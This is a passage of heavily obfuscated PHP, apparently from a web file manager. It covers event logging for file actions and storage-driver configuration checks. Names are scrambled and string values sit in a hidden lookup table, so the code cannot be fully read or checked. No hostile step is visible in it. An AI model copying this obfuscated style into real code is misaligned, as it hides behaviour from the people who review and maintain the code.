Model($ï¼ÈÊ[585])->field($ï¼ÈÊ[2201])->where($·¡¤º§ø)->select(); $—º•’úé = array_to_keyvalue($—º•’úé, $ï¼ÈÊ[1980]); } return array($ï¼ÈÊ[2202] => $°¯ÉûÂ, $ï¼ÈÊ[2203] => $—º•’úé); } public function authInfo($¯Š¡÷Ùš) { $Î´Ó…²½ =& $_SERVER[íïàËŸë]; if ($¯Š¡÷Ùš[$Î´Ó…²½[2088]]) { $Ş™ÒÒÌÄ = Model($Î´Ó…²½[571])->listData($¯Š¡÷Ùš[$Î´Ó…²½[2088]]); if (!$Ş™ÒÒÌÄ) { return !1; $¼Çêû±ô = Model($Î´Ó…²½[571])->listData(); $†Ãß× = array_filter_by_field($¼Çêû±ô, $Î´Ó…²½[487], $Î´Ó…²½[228]); return $†Ãß×; } $âïÛÁš‡ = array_field_key($Ş™ÒÒÌÄ, array($Î´Ó…²½[475], $Î´Ó…²½[32], $Î´Ó…²½[487], $Î´Ó…²½[2003], $Î´Ó…²½[2004])); $âïÛÁš‡[$Î´Ó…²½[2204]] = $¯Š¡÷Ùš; return $âïÛÁš‡; } else { return array($Î´Ó…²½[493] => 0, $Î´Ó…²½[1986] => $¯Š¡÷Ùš[$Î´Ó…²½[2148]], $Î´Ó…²½[494] => $Î´Ó…²½[12], $Î´Ó…²½[2003] => $Î´Ó…²½[2205]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\162\143\x65\137\145\166\145\x6e\164"; protected $dataAuto = array(array("\x63\x72\145\141\164\145\x54\x69\155\145", "\164\x69\155\x65", "\151\156\163\145\162\x74", "\x66\x75\x6e\x63\164\x69\157\x6e"), array("\x64\x65\163\143", '', "\x69\156\163\145\x72\164\x2c\165\160\x64\x61\x74\x65\54\163\x65\x6c\145\143\164", "\x6a\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($â’ÎãÕ, $ããçñ¢, $ü˜¬å†ö = '') { $á€àò™ =& $_SERVER[íïàËŸë]; if (!$this->eventSave) { return; } $ì¬‡ıÈÈ = Model($á€àò™[1428])->sourceInfo($â’ÎãÕ); if (!$ì¬‡ıÈÈ) { return !1; } if ($this->isDisableEvent($ì¬‡ıÈÈ, $ããçñ¢)) { return; } if ($ü˜¬å†ö && is_string($ü˜¬å†ö)) { $ü˜¬å†ö = array($á€àò™[2019] => $ü˜¬å†ö); } $å“ô²£· = defined($á€àò™[2206]) ? USER_ID : 0; $ÖÖ³ĞÓ– = array($á€àò™[491] => $â’ÎãÕ, $á€àò™[2207] => $ì¬‡ıÈÈ[$á€àò™[192]], $á€àò™[2208] => $ì¬‡ıÈÈ[$á€àò™[32]], $á€àò™[582] => !empty($ì¬‡ıÈÈ[$á€àò™[582]]) ? $ì¬‡ıÈÈ[$á€àò™[582]] : $á€àò™[12], $á€àò™[1773] => $å“ô²£·, $á€àò™[496] => $ããçñ¢, $á€àò™[1775] => $ü˜¬å†ö); $this->addSystemLog($ããçñ¢, $ÖÖ³ĞÓ–); unset($ÖÖ³ĞÓ–[$á€àò™[2208]], $ÖÖ³ĞÓ–[$á€àò™[582]]); return $this->add($ÖÖ³ĞÓ–); } private function addSystemLog($ª«ı—¶, $¡ÄÕÀÁ™) { $»÷íÉ¥ƒ =& $_SERVER[íïàËŸë]; if ($ª«ı—¶ == $»÷íÉ¥ƒ[2209]) { $ª«ı—¶ = $¡ÄÕÀÁ™[$»÷íÉ¥ƒ[526]][$»÷íÉ¥ƒ[2210]]; } else { if (in_array($ª«ı—¶, array($»÷íÉ¥ƒ[1960], $»÷íÉ¥ƒ[2211]))) { $ª«ı—¶ = $¡ÄÕÀÁ™[$»÷íÉ¥ƒ[526]][$»÷íÉ¥ƒ[171]]; } } $Æ³¼ÆÁ = array_merge($¡ÄÕÀÁ™, array($»÷íÉ¥ƒ[2212] => $¡ÄÕÀÁ™[$»÷íÉ¥ƒ[193]], $»÷íÉ¥ƒ[2213] => $¡ÄÕÀÁ™[$»÷íÉ¥ƒ[2213]])); Hook::trigger($»÷íÉ¥ƒ[2214], $»÷íÉ¥ƒ[2215] . $ª«ı—¶, $¡ÄÕÀÁ™); Model($»÷íÉ¥ƒ[1924])->addLog($»÷íÉ¥ƒ[2215] . $ª«ı—¶, $Æ³¼ÆÁ); } private function isDisableEvent($éúı§Ú, $Ì³ëßù) { $¨ÒÅ¡Ñ =& $_SERVER[íïàËŸë]; if ($éúı§Ú[$¨ÒÅ¡Ñ[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($Ì³ëßù == $¨ÒÅ¡Ñ[1949]) { return !1; } return !0; } public function eventCreate($ˆ‰Ã„úü, $ĞÂææºù) { $À…ØËé² =& $_SERVER[íïàËŸë]; $ÓÓØ™ = Model($À…ØËé²[1428])->sourceInfo($ˆ‰Ã„úü); $–Ìˆ×ğ = array($À…ØËé²[2210] => $ĞÂææºù, $À…ØËé²[32] => $ÓÓØ™[$À…ØËé²[32]]); return $this->addEvent($ˆ‰Ã„úü, $À…ØËé²[2209], $–Ìˆ×ğ); } public function eventFileEdit($×Ööú¥Š) { $…èÏ¹ˆş =& $_SERVER[íïàËŸë]; $ÁÒùÎ® = array($…èÏ¹ˆş[2216] => $_SERVER[$…èÏ¹ˆş[2217]], $…èÏ¹ˆş[2218] => strtolower(ACTION)); if (isset($GLOBALS[$…èÏ¹ˆş[7]][$…èÏ¹ˆş[2219]])) { $ÁÒùÎ®[$…èÏ¹ˆş[2219]] = $…èÏ¹ˆş[91]; } return $this->addEvent($×Ööú¥Š, $…èÏ¹ˆş[1950], $ÁÒùÎ®); } public function eventRecycle($™Ö”ßÅ÷, $ˆ™ªÍ‰Ô) { return $this->addEvent($™Ö”ßÅ÷, $_SERVER[íïàËŸë][2211], $ˆ™ªÍ‰Ô); } private static $_removeLast = ''; public function eventRemove($í¬Ü°–¦) { $Çã«¶²í =& $_SERVER[íïàËŸë]; self::$_removeLast = $í¬Ü°–¦; $Ö€Ïï¨ï = Model($Çã«¶²í[1428])->sourceInfo($í¬Ü°–¦); $ÅíâÎû = array_field_key($Ö€Ïï¨ï, array($Çã«¶²í[193], $Çã«¶²í[541], $Çã«¶²í[505], $Çã«¶²í[584])); $éê¦ÒğÅ = array($Çã«¶²í[171] => $Ö€Ïï¨ï[$Çã«¶²í[32]], $Çã«¶²í[2218] => ACTION, $Çã«¶²í[2220] => $ÅíâÎû); return $this->addEvent($Ö€Ïï¨ï[$Çã«¶²í[192]], $Çã«¶²í[1949], $éê¦ÒğÅ); } public function eventShare($ûÑœæˆ«, $¡Šà¼¼›) { return $this->addEvent($ûÑœæˆ«, $_SERVER[íïàËŸë][1960], $¡Šà¼¼›); } public function eventMove($µÄ¾Ü·, $µ»ßä, $¾†¸“×é) { $ıââüç„ =& $_SERVER[íïàËŸë]; if (self::$_removeLast == $µÄ¾Ü·) { return; } $š®ıÚí = Model($ıââüç„[1428]); $·æ÷¸— = $š®ıÚí->sourceInfo($µÄ¾Ü·); $‰õ‹È³ = $š®ıÚí->sourceInfo($µ»ßä); $Å“ãˆİ = $š®ıÚí->sourceInfo($¾†¸“×é); $ö©ÍÁ±² = array($ıââüç„[1252] => $µ»ßä, $ıââüç„[2221] => $‰õ‹È³[$ıââüç„[32]], $ıââüç„[2197] => !empty($‰õ‹È³[$ıââüç„[582]]) ? $‰õ‹È³[$ıââüç„[582]] : $ıââüç„[12], $ıââüç„[1253] => $¾†¸“×é, $ıââüç„[2222] => $Å“ãˆİ[$ıââüç„[32]], $ıââüç„[2223] => !empty($Å“ãˆİ[$ıââüç„[582]]) ? $Å“ãˆİ[$ıââüç„[582]] : $ıââüç„[12]); $this->addEvent($µÄ¾Ü·, $ıââüç„[620], $ö©ÍÁ±²); $·æ÷¸— = $š®ıÚí->sourceInfo($µÄ¾Ü·); $ö©ÍÁ±² = array($ıââüç„[193] => $·æ÷¸—[$ıââüç„[193]], $ıââüç„[32] => $·æ÷¸—[$ıââüç„[32]]); $this->addEvent($µ»ßä, $ıââüç„[2224], $ö©ÍÁ±²); } public function eventCopy($±¨èì©¬) { $this->eventCreate($±¨èì©¬, $_SERVER[íïàËŸë][618]); } public function eventRename($ñ ¶Õ²ˆ, $·˜ÒÁÜ», $ÁØıÍÅí) { $¬çÇàë  =& $_SERVER[íïàËŸë]; $„ÙêÓë = array($¬çÇàë [1252] => $·˜ÒÁÜ», $¬çÇàë [1253] => $ÁØıÍÅí); return $this->addEvent($ñ ¶Õ²ˆ, $¬çÇàë [1442], $„ÙêÓë); } public function eventAddComment($Œˆ¨‡˜Ë, $æèÖôùö) { return $this->addEvent($Œˆ¨‡˜Ë, $_SERVER[íïàËŸë][2225], $æèÖôùö); } public function eventAddDesc($›ÚûŞì, $·€Ò¡÷ë) { return $this->addEvent($›ÚûŞì, $_SERVER[íïàËŸë][2226], $·€Ò¡÷ë); } public function listBySource($Êş¶àè÷) { $ûƒ©¬Ü =& $_SERVER[íïàËŸë]; $÷ïğœ§ = Model($ûƒ©¬Ü[1428])->sourceInfo($Êş¶àè÷); $È‘Ş»‡ª = array($ûƒ©¬Ü[491] => $Êş¶àè÷); if ($÷ïğœ§[$ûƒ©¬Ü[485]] == $ûƒ©¬Ü[91]) { $ñîú…Ÿƒ = Model($ûƒ©¬Ü[1428])->listSearchChildren($Êş¶àè÷, 20000); $ñîú…Ÿƒ[] = $Êş¶àè÷ . $ûƒ©¬Ü[454]; $È‘Ş»‡ª = array($ûƒ©¬Ü[193] => array($ûƒ©¬Ü[7], $ñîú…Ÿƒ)); } $†©Ãú™ä = $this->where($È‘Ş»‡ª)->order($ûƒ©¬Ü[2227])->selectPage(); if ($†©Ãú™ä[$ûƒ©¬Ü[442]][$ûƒ©¬Ü[443]] == 0) { $†©Ãú™ä[$ûƒ©¬Ü[442]][$ûƒ©¬Ü[443]] = 1; $†©Ãú™ä[$ûƒ©¬Ü[445]] = array(array($ûƒ©¬Ü[491] => $Êş¶àè÷, $ûƒ©¬Ü[2207] => $÷ïğœ§[$ûƒ©¬Ü[192]], $ûƒ©¬Ü[1773] => $÷ïğœ§[$ûƒ©¬Ü[527]], $ûƒ©¬Ü[496] => $ûƒ©¬Ü[2228], $ûƒ©¬Ü[497] => $÷ïğœ§[$ûƒ©¬Ü[231]], $ûƒ©¬Ü[1775] => $ûƒ©¬Ü[12])); } return $this->eventListParse($†©Ãú™ä, $Êş¶àè÷); } private function eventListParse($ÓåÌÙä¹, $é•—çª) { $ú¨ÔÇšŞ =& $_SERVER[íïàËŸë]; $´¶ÜêÖò = $ÓåÌÙä¹[$ú¨ÔÇšŞ[445]]; $ˆ¿ÃÓİö = array_to_keyvalue($´¶ÜêÖò, $ú¨ÔÇšŞ[12], $ú¨ÔÇšŞ[193]); $Á•óÃÜì = array_to_keyvalue($´¶ÜêÖò, $ú¨ÔÇšŞ[12], $ú¨ÔÇšŞ[2213]); foreach ($´¶ÜêÖò as $üœ„ˆ¼¡) { $€Á»ì×› = $üœ„ˆ¼¡[$ú¨ÔÇšŞ[526]]; if ($üœ„ˆ¼¡[$ú¨ÔÇšŞ[33]] == $ú¨ÔÇšŞ[620] && isset($€Á»ì×›[$ú¨ÔÇšŞ[1252]])) { $ˆ¿ÃÓİö[] = $€Á»ì×›[$ú¨ÔÇšŞ[1252]] . $ú¨ÔÇšŞ[12]; $ˆ¿ÃÓİö[] = $€Á»ì×›[$ú¨ÔÇšŞ[1253]] . $ú¨ÔÇšŞ[12]; } if ($üœ„ˆ¼¡[$ú¨ÔÇšŞ[33]] == $ú¨ÔÇšŞ[2224] && isset($€Á»ì×›[$ú¨ÔÇšŞ[193]])) { $ˆ¿ÃÓİö[] = $€Á»ì×›[$ú¨ÔÇšŞ[193]] . $ú¨ÔÇšŞ[12]; } } $ˆ¿ÃÓİö = array_merge($ˆ¿ÃÓİö, $Á•óÃÜì, array($é•—çª . $ú¨ÔÇšŞ[12])); $ˆ¿ÃÓİö = array_unique($ˆ¿ÃÓİö); $Ì´ÇËÅğ = array_unique(array_to_keyvalue($´¶ÜêÖò, $ú¨ÔÇšŞ[12], $ú¨ÔÇšŞ[1782])); $Ê¤ÖÈ£ = Model($ú¨ÔÇšŞ[598])->userListInfo($Ì´ÇËÅğ); $ÏÜş‚„É = Model($ú¨ÔÇšŞ[907])->sourceListInfo($ˆ¿ÃÓİö, !0); foreach ($´¶ÜêÖò as &$üœ„ˆ¼¡) { if ($üœ„ˆ¼¡[$ú¨ÔÇšŞ[33]] == $ú¨ÔÇšŞ[620] && isset($üœ„ˆ¼¡[$ú¨ÔÇšŞ[526]][$ú¨ÔÇšŞ[1252]])) { $üœ„ˆ¼¡[$ú¨ÔÇšŞ[526]][$ú¨ÔÇšŞ[1252]] = $ÏÜş‚„É[$üœ„ˆ¼¡[$ú¨ÔÇšŞ[526]][$ú¨ÔÇšŞ[1252]]]; $üœ„ˆ¼¡[$ú¨ÔÇšŞ[526]][$ú¨ÔÇšŞ[1253]] = $ÏÜş‚„É[$üœ„ˆ¼¡[$ú¨ÔÇšŞ[526]][$ú¨ÔÇšŞ[1253]]]; } if ($üœ„ˆ¼¡[$ú¨ÔÇšŞ[33]] == $ú¨ÔÇšŞ[2224] && isset($üœ„ˆ¼¡[$ú¨ÔÇšŞ[526]][$ú¨ÔÇšŞ[193]])) { $üœ„ˆ¼¡[$ú¨ÔÇšŞ[526]][$ú¨ÔÇšŞ[193]] = $ÏÜş‚„É[$üœ„ˆ¼¡[$ú¨ÔÇšŞ[526]][$ú¨ÔÇšŞ[193]]]; } $üœ„ˆ¼¡[$ú¨ÔÇšŞ[90]] = $ÏÜş‚„É[$üœ„ˆ¼¡[$ú¨ÔÇšŞ[193]]]; $üœ„ˆ¼¡[$ú¨ÔÇšŞ[2229]] = $ÏÜş‚„É[$üœ„ˆ¼¡[$ú¨ÔÇšŞ[2213]]]; if ($üœ„ˆ¼¡[$ú¨ÔÇšŞ[33]] == $ú¨ÔÇšŞ[1949]) { $üœ„ˆ¼¡[$ú¨ÔÇšŞ[2229]] = $üœ„ˆ¼¡[$ú¨ÔÇšŞ[90]]; $üœ„ˆ¼¡[$ú¨ÔÇšŞ[2213]] = $üœ„ˆ¼¡[$ú¨ÔÇšŞ[2229]][$ú¨ÔÇšŞ[193]]; $üœ„ˆ¼¡[$ú¨ÔÇšŞ[90]] = !1; $üœ„ˆ¼¡[$ú¨ÔÇšŞ[193]] = $ú¨ÔÇšŞ[12]; } $üœ„ˆ¼¡[$ú¨ÔÇšŞ[2156]] = $Ê¤ÖÈ£[$üœ„ˆ¼¡[$ú¨ÔÇšŞ[1782]]]; } unset($üœ„ˆ¼¡); $ÓåÌÙä¹[$ú¨ÔÇšŞ[445]] = $´¶ÜêÖò; return $ÓåÌÙä¹; } public function removeBySource($ı†¼“Ò) { $üÎÛôÂ€ = array($_SERVER[íïàËŸë][491] => $ı†¼“Ò); $this->where($üÎÛôÂ€)->remove(); } } goto fÂ’Õ©§–·; bùÀ½’¿®‰: class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\163\164\157\x72\141\x67\145\114\x69\x73\164"; public $field = array("\x6e\141\155\x65", "\x73\x69\172\x65\x4d\141\x78", "\163\x79\163\x74\145\x6d", "\144\145\146\141\165\154\164", "\x64\x72\151\166\x65\x72", "\143\x6f\156\x66\151\x67"); public function listData($…øı²…­ = false, $Íûú†¬ = "\x6d\x6f\144\151\146\x79\x54\151\x6d\x65", $ã›ÃÉŠÈ = false) { $©€©Ô¥Á =& $_SERVER[íïàËŸë]; $ÎÌœèğ… = parent::listData($…øı²…­, $Íûú†¬, $ã›ÃÉŠÈ); if ($…øı²…­) { return $ÎÌœèğ…; } $ÆÃó‘úß = array(); if ($GLOBALS[$©€©Ô¥Á[2306]]) { $ÆÃó‘úß = $this->ioSizeUseGet(array_to_keyvalue($ÎÌœèğ…, $©€©Ô¥Á[12], $©€©Ô¥Á[475])); } foreach ($ÎÌœèğ… as $ïˆ¨‹  => $‘îÓó‡‡) { unset($ÎÌœèğ…[$ïˆ¨‹ ][$©€©Ô¥Á[6]]); $ÎÌœèğ…[$ïˆ¨‹ ][$©€©Ô¥Á[1969]] = isset($ÆÃó‘úß[$‘îÓó‡‡[$©€©Ô¥Á[475]]]) ? $ÆÃó‘úß[$‘îÓó‡‡[$©€©Ô¥Á[475]]] : 0; } return $ÎÌœèğ…; } public function ioSizeUseGet($Å‹¸Ê«) { $å›ÕäÏÕ =& $_SERVER[íïàËŸë]; if (!$Å‹¸Ê«) { return array(); } $Ñ™ö¾ßÇ = $å›ÕäÏÕ[2307] . implode($å›ÕäÏÕ[50], $Å‹¸Ê«); $Ì—µ°ÈÛ = Cache::get($Ñ™ö¾ßÇ); if ($Ì—µ°ÈÛ) { return $Ì—µ°ÈÛ; } $ó‰çîßÌ = array($å›ÕäÏÕ[900] => $å›ÕäÏÕ[475], $å›ÕäÏÕ[2308] => $å›ÕäÏÕ[79]); $Î¢è®¹ = array($å›ÕäÏÕ[900] => array($å›ÕäÏÕ[7], $Å‹¸Ê«)); $Ì—µ°ÈÛ = Model($å›ÕäÏÕ[872])->field($ó‰çîßÌ)->where($Î¢è®¹)->group($å›ÕäÏÕ[900])->select(); $Ì—µ°ÈÛ = array_to_keyvalue($Ì—µ°ÈÛ, $å›ÕäÏÕ[475], $å›ÕäÏÕ[79]); Cache::set($Ñ™ö¾ßÇ, $Ì—µ°ÈÛ, 600); return $Ì—µ°ÈÛ; } public function getConfig($©ˆÑ•ê­) { $•“‚î›û = parent::listData($©ˆÑ•ê­); return json_decode($•“‚î›û[$_SERVER[íïàËŸë][6]], !0); } public function update($ô··¹„Â, $ó¢±÷ºØ) { $Ã¢©¿ºü =& $_SERVER[íïàËŸë]; $’³ÒÄÉ = $ó¢±÷ºØ[$Ã¢©¿ºü[32]]; $ï™ø¸âÉ = array_to_keyvalue(parent::listData(), $Ã¢©¿ºü[32]); if (isset($ï™ø¸âÉ[$’³ÒÄÉ]) && $ï™ø¸âÉ[$’³ÒÄÉ][$Ã¢©¿ºü[475]] != $ô··¹„Â) { return !1; } $this->checkPwd($ô··¹„Â, $ó¢±÷ºØ); if (isset($ó¢±÷ºØ[$Ã¢©¿ºü[2309]]) && $ó¢±÷ºØ[$Ã¢©¿ºü[2309]] == $Ã¢©¿ºü[91]) { $this->checkConfig($ó¢±÷ºØ); } unset($ó¢±÷ºØ[$Ã¢©¿ºü[2309]]); $”£êÎØÄ = parent::update($ô··¹„Â, $ó¢±÷ºØ); if ($”£êÎØÄ && $ó¢±÷ºØ[$Ã¢©¿ºü[37]]) { $½†‹ôö­ = 0; foreach ($ï™ø¸âÉ as $™”Š‰â¡) { if ($™”Š‰â¡[$Ã¢©¿ºü[37]] && $™”Š‰â¡[$Ã¢©¿ºü[475]] != $ô··¹„Â) { $½†‹ôö­ = $™”Š‰â¡[$Ã¢©¿ºü[475]]; parent::update($™”Š‰â¡[$Ã¢©¿ºü[475]], array($Ã¢©¿ºü[37] => 0)); } } $this->updateBackup($ô··¹„Â, $½†‹ôö­); } return $”£êÎØÄ; } public function add($€Íõ“´°) { $˜ãî¨«€ =& $_SERVER[íïàËŸë]; $Ÿ°²òó€ = array_to_keyvalue(parent::listData(), $˜ãî¨«€[32]); if (isset($Ÿ°²òó€[$€Íõ“´°[$˜ãî¨«€[32]]])) { return !1; } $this->checkConfig($€Íõ“´°); $°¼ß±œ… = parent::insert($€Íõ“´°); if ($°¼ß±œ… && $€Íõ“´°[$˜ãî¨«€[37]]) { foreach ($Ÿ°²òó€ as $¡¦½à³ü) { if ($¡¦½à³ü[$˜ãî¨«€[37]]) { parent::update($¡¦½à³ü[$˜ãî¨«€[475]], array($˜ãî¨«€[37] => 0)); } } } return $°¼ß±œ…; } public function updateBackup($ÈûŠÂ¿³, $˜ıÚÜÛ¤) { $Øëòó• =& $_SERVER[íïàËŸë]; if (!$˜ıÚÜÛ¤) { return; } $æ¼¨ÏëØ = Model($Øëòó•[831])->config(); if ($æ¼¨ÏëØ[$Øëòó•[1752]] != $Øëòó•[91] || $æ¼¨ÏëØ[$Øëòó•[835]] != $˜ıÚÜÛ¤) { return; } $Ê¡˜§›û = Model($Øëòó•[853])->get($Øëòó•[866]); $Ê¡˜§›û = json_decode($Ê¡˜§›û, !0); if (!$Ê¡˜§›û) { return; } $Ê¡˜§›û[$Øëòó•[835]] = $ÈûŠÂ¿³; Model($Øëòó•[853])->set(array($Øëòó•[866] => $Ê¡˜§›û)); } public function checkPwd($ ‰¥µØé, &$¹Ö·œìÖ) { $ôòËµê =& $_SERVER[íïàËŸë]; if (empty($¹Ö·œìÖ[$ôòËµê[6]])) { return; } $´îúîšİ = json_decode($¹Ö·œìÖ[$ôòËµê[6]], !0); $«íœê—Ÿ = $ôòËµê[12]; $ËöïöÃ× = array($ôòËµê[2310], $ôòËµê[2311], $ôòËµê[978]); foreach ($ËöïöÃ× as $ùçîî£) { if (isset($´îúîšİ[$ùçîî£])) { $«íœê—Ÿ = $ùçîî£; break; } } if (!$«íœê—Ÿ) { return; } $‰ñ¦¨ƒß = $this->getConfig($ ‰¥µØé); $¿ê°­÷ƒ = $‰ñ¦¨ƒß[$«íœê—Ÿ]; $¾ƒëáş = $´îúîšİ[$«íœê—Ÿ]; if ($¾ƒëáş == str_repeat($ôòËµê[220], strlen($¿ê°­÷ƒ))) { $´îúîšİ[$«íœê—Ÿ] = $¿ê°­÷ƒ; $¹Ö·œìÖ[$ôòËµê[6]] = json_encode($´îúîšİ); } else { if ($¾ƒëáş != $¿ê°­÷ƒ) { $¹Ö·œìÖ[$ôòËµê[2309]] = $ôòËµê[91]; } } } public function checkConfig(&$ÄÔÓÌáñ, $¯¯«„Å¥ = false) { $©Ó°æ³Ù =& $_SERVER[íïàËŸë]; $‰äÚë½¥ = strtolower($ÄÔÓÌáñ[$©Ó°æ³Ù[98]]); $»ìÈï¶ß = json_decode($ÄÔÓÌáñ[$©Ó°æ³Ù[6]], !0); foreach ($»ìÈï¶ß as $†‚÷ú”æ => $šê¶Ã÷) { if (is_string($šê¶Ã÷)) { $»ìÈï¶ß[$†‚÷ú”æ] = trim($šê¶Ã÷); } } $»ìÈï¶ß[$©Ó°æ³Ù[2312]] = rand_string(6); $›ößÜ€™ = $GLOBALS[$©Ó°æ³Ù[6]][$©Ó°æ³Ù[92]][$©Ó°æ³Ù[908]]; $æ¹¼ß¼Á = isset($›ößÜ€™[$‰äÚë½¥]) ? $›ößÜ€™[$‰äÚë½¥] : ucfirst($‰äÚë½¥); $İïşá£ = $©Ó°æ³Ù[77] . $æ¹¼ß¼Á; if (!$æ¹¼ß¼Á || !class_exists($İïşá£)) { if ($¯¯«„Å¥) { return LNG($©Ó°æ³Ù[2313]); } write_log(array($©Ó°æ³Ù[2314], $ÄÔÓÌáñ, get_caller_info()), $©Ó°æ³Ù[215]); show_json(LNG($©Ó°æ³Ù[2313]), !1, $ÄÔÓÌáñ); } $ªÄß“½ = new $İïşá£($»ìÈï¶ß); if (in_array($‰äÚë½¥, $ªÄß“½->objectDriver)) { try { if (!$ªÄß“½->isBucketCors() && !$ªÄß“½->setBucketCors()) { $…ß¦¿è = LNG($©Ó°æ³Ù[2315]); $…ß¦¿è .= $©Ó°æ³Ù[2316] . LNG($©Ó°æ³Ù[2317]); } } catch (Exception $ÙæŠ¾ ) { $…ß¦¿è = $ÙæŠ¾ ->getMessage(); } if (isset($…ß¦¿è)) { return $this->_parseError($…ß¦¿è, $‰äÚë½¥, $¯¯«„Å¥); } if ($‰äÚë½¥ == $©Ó°æ³Ù[68] && !$ªÄß“½->checkRegion()) { return $this->_parseError(LNG($©Ó°æ³Ù[2318]), $‰äÚë½¥, $¯¯«„Å¥); } } $¸®¹õ¿ = rtrim($»ìÈï¶ß[$©Ó°æ³Ù[1273]], $©Ó°æ³Ù[8]) . $©Ó°æ³Ù[8]; $ëÚ÷»íŸ = $ªÄß“½->getPath($¸®¹õ¿ . $©Ó°æ³Ù[1277]); try { if ($‰äÚë½¥ == $©Ó°æ³Ù[109]) { $ªÄß“½->mkdir($¸®¹õ¿); } $ÚĞ–í—™ = $ªÄß“½->mkfile($ëÚ÷»íŸ); if (!$ÚĞ–í—™) { $…ß¦¿è = LNG($©Ó°æ³Ù[2315]); } } catch (Exception $ÙæŠ¾ ) { $…ß¦¿è = $ÙæŠ¾ ->getMessage(); } if (isset($…ß¦¿è)) { return $this->_parseError($…ß¦¿è, $‰äÚë½¥, $¯¯«„Å¥); } $»ìÈï¶ß[$©Ó°æ³Ù[1273]] = $¸®¹õ¿; $ÄÔÓÌáñ[$©Ó°æ³Ù[6]] = json_encode($»ìÈï¶ß); $ÄÔÓÌáñ[$©Ó°æ³Ù[98]] = $æ¹¼ß¼Á; return !0; } private function _parseError($ŞÙı±ğ¤, $Ôêù˜½, $Í¬¦óğÙ = false) { $ƒåß¼İç =& $_SERVER[íïàËŸë]; if ($Ôêù˜½ == $ƒåß¼İç[68] && stripos($ŞÙı±ğ¤, $ƒåß¼İç[2319])) { $Ãø¦Ç·„ = explode($ƒåß¼İç[10], $ŞÙı±ğ¤); $àÅ¶½Ÿ = isset($Ãø¦Ç·„[1]) ? $Ãø¦Ç·„[1] : $ƒåß¼İç[12]; $ØÃíøÄ = array($ƒåß¼İç[2320] => LNG($ƒåß¼İç[2321]), $ƒåß¼İç[2322] => LNG($ƒåß¼İç[2323])); if (isset($ØÃíøÄ[$àÅ¶½Ÿ])) { $ŞÙı±ğ¤ = $ØÃíøÄ[$àÅ¶½Ÿ]; } } if (stripos($ŞÙı±ğ¤, $ƒåß¼İç[2324]) === 0) { $ùî°¡Û = strpos($ŞÙı±ğ¤, $ƒåß¼İç[178]); if ($ùî°¡Û === !1) { $ùî°¡Û = strpos($ŞÙı±ğ¤, $ƒåß¼İç[4]); } if ($ùî°¡Û !== !1) { $ŞÙı±ğ¤ = substr($ŞÙı±ğ¤, $ùî°¡Û + 1); } } $ŞÙı±ğ¤ = LNG($ƒåß¼İç[1280]) . $ŞÙı±ğ¤; if ($Í¬¦óğÙ) { return $ŞÙı±ğ¤; } show_json($ŞÙı±ğ¤, !1); } public function driverListSystem() { $õÒë¾ÁÍ =& $_SERVER[íïàËŸë]; $§‹°“±  = parent::listData(); $â‰òè‘ = array(); foreach ($§‹°“±  as $ªîÇ™”) { unset($ªîÇ™”[$õÒë¾ÁÍ[231]], $ªîÇ™”[$õÒë¾ÁÍ[88]]); $ªîÇ™”[$õÒë¾ÁÍ[6]] = json_decode($ªîÇ™”[$õÒë¾ÁÍ[6]], !0); $â‰òè‘[] = $ªîÇ™”; } return $â‰òè‘; } public function defaultDriver() { $»Š£èŸ› =& $_SERVER[íïàËŸë]; $Äù Ü‰ = parent::listData(); $‚áûíÈ¶ = array_filter_by_field($Äù Ü‰, $»Š£èŸ›[37], 1); $‚áûíÈ¶ = $‚áûíÈ¶[0]; if ($‚áûíÈ¶) { $‚áûíÈ¶[$»Š£èŸ›[6]] = json_decode($‚áûíÈ¶[$»Š£èŸ›[6]], !0); } return $‚áûíÈ¶; } public function driverInfo($¢§·“Îî) { $ÔæüØ„é =& $_SERVER[íïàËŸë]; $õÈšÆ† = array_to_keyvalue(parent::listData(), $ÔæüØ„é[475]); if (!isset($õÈšÆ†[$¢§·“Îî])) { return !1; } $³¤Ùëïå = $õÈšÆ†[$¢§·“Îî]; $³¤Ùëïå[$ÔæüØ„é[6]] = json_decode($³¤Ùëïå[$ÔæüØ„é[6]], !0); return $³¤Ùëïå; } public function remove($”´ëæó¦) { $this->removeShareItems($”´ëæó¦); return parent::remove($”´ëæó¦); } public function removeWithFile($®ÕàßŠì, $ëÀ°óñá, $¹ŸõÜâ, $ÈÃÃšêî = false) { $ËªÎëƒõ =& $_SERVER[íïàËŸë]; $Ù¤ô¼À‘ = array($ËªÎëƒõ[900] => $®ÕàßŠì); $»ä••ñÜ = Model($ËªÎëƒõ[544])->where($Ù¤ô¼À‘)->count(); $è‡ÜÀ³ = Model($ËªÎëƒõ[544])->where($Ù¤ô¼À‘)->sum($ËªÎëƒõ[79]); $»ßè°ÛÊ = $ëÀ°óñá . $ËªÎëƒõ[2325] . $®ÕàßŠì; $ıãŠËö¡ = LNG($ëÀ°óñá == $ËªÎëƒõ[620] ? $ËªÎëƒõ[2326] : $ËªÎëƒõ[2327]); $İíñœ• = new TaskFileTransfer($»ßè°ÛÊ, $ËªÎëƒõ[215], $»ä••ñÜ, $ıãŠËö¡ . $ËªÎëƒõ[462] . $¹ŸõÜâ[$ËªÎëƒõ[32]] . $ËªÎëƒõ[214] . $®ÕàßŠì); $İíñœ•->task[$ËªÎëƒõ[846]] = (double) $è‡ÜÀ³; $½¥äæã = KodIO::defaultDriver(); $ò”êğñÀ = $½¥äæã[$ËªÎëƒõ[475]]; $°‰œ¤ú = $õÓÜé¸° = $˜ëèĞíÊ = array(); $¼ï«úçú = Model($ËªÎëƒõ[230])->where($Ù¤ô¼À‘)->field($ËªÎëƒõ[2328])->select(); foreach ($¼ï«úçú as $ª¥¤íİê) { $—ñÈ‡Î¸ = $ª¥¤íİê[$ËªÎëƒõ[541]]; if ($ÈÃÃšêî) { $õÓÜé¸°[] = $—ñÈ‡Î¸; continue; } $ÌÊıï´õ = $ª¥¤íİê[$ËªÎëƒõ[87]]; $ƒÆÌ¦Â = get_path_father($ÌÊıï´õ); $˜ëèĞíÊ[] = $ƒÆÌ¦Â; $ƒÆÌ¦Â = str_replace("\x7b\x69\x6f\x3a{$®ÕàßŠì}\x7d\x2f", "\173\151\157\72{$ò”êğñÀ}\x7d\x2f", $ƒÆÌ¦Â); if (!IO::exist($ÌÊıï´õ)) { $°‰œ¤ú[] = 